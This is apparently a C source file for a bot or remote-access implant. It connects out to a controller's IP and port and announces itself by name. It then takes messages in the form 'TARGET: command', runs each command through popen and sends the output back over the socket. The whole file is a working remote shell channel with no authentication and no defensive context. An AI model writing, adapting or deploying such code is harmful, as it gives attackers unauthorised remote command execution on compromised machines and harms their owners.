#include "connect.h"

int execute (int s, char *cmd) {
  char line[CMD_LENGTH];
  FILE *f = popen (cmd, "r");
  if (!f) return -1;
  while (!feof (f)) {
    char *success = fgets(line, CMD_LENGTH, f);
    if (!success) break;
    respond (s, line);
  }
  fclose(f);
  return 0;
}

int parse (int s, char *msg) {
  char *cmd = strchr(msg, ':');
  if (cmd == NULL) {
    printf("Incorrect formatting. Reference: TARGET: command");
    return -1;
  }
  cmd ++;
  cmd[strlen(cmd) - 1] = 0;
  printf ("Recieved command: %s\n", cmd);
  execute (s, cmd);
  return 0;
}


int init_channel (char *ip, int port, char *name) {
	char msg[CMD_LENGTH];
	struct sockaddr_in server;
	int channel;

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
  server.sin_port = htons(port);

  if((channel = socket (PF_INET, SOCK_STREAM, 0)) < 0) {
    perror ("socket:");
    exit(1);
  }
  if ((connect (channel, (struct sockaddr*) &server, sizeof(server))) < 0) {
    perror ("connect:");
    exit(1);
  }

  snprintf (msg, CMD_LENGTH, "%s: This is '%s' Up and Running\n", name, name);
  respond (channel, msg);
  return channel;
}